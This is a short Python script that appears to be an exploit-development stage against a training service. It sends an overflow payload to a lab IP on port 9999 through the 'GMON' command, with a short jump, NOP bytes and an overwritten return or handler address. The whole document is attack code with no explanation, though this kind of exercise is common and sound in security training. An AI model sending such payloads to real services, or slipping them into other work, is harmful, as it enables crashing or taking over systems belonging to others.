import socket, sys
payload=b"A"*3549
#payload+=b"B"*4
payload+=b"\xeb\xce"
payload+=b"\x90\x90"
#payload+=b"C"*4
payload+=b"\xb4\x10\x50\x62"
payload+=b"D"*(5000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()
